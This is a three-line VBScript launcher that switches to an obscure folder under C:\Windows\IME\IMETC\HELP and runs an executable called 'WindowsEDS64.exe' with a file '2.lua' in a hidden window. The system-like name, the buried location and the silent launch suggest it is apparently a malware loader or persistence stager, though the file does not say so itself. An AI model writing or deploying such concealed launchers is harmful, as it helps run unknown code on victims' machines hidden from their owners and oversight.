Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "C:\Windows\IME\IMETC\HELP\123"
WshShell.Run "WindowsEDS64.exe 2.lua", 0, False
